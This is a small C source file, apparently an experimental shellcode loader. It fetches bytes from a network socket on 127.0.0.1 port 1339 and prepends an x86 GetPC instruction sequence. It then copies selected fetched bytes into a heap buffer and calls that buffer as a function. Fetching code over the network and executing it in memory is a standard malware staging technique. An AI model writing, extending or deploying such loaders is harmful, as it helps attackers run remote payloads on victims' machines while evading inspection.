#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "fetcher.h"
#define GETPC_SIZE 9

char *shellcode_parser(char *byte_input, int shellcode_index[30]){
	void *ptr_to_shellcode = malloc(0x500);	
	unsigned char *getpc_routine = "\x89\xe3\xd9\xe1\xd9\x73\xf4\x5b\x53";
	memcpy(ptr_to_shellcode,getpc_routine,GETPC_SIZE);
	for(int x = 0; x < 3;x++){
		int sentinal = shellcode_index[x];
		memcpy(ptr_to_shellcode+GETPC_SIZE+x,(byte_input+sentinal),sizeof(char));
	};


	return ptr_to_shellcode;
};



int main(){
	int shellcode_array[30] = {0,4,8};
	char *bytes_location = fetch("127.0.0.1",1339);
	char *parsed_shellcode = shellcode_parser(bytes_location+4,shellcode_array);

	printf("%s\n",bytes_location);
	printf("%p\n",parsed_shellcode);
	void (*run_shellcode)() = parsed_shellcode;

	run_shellcode();

	return 0;
};
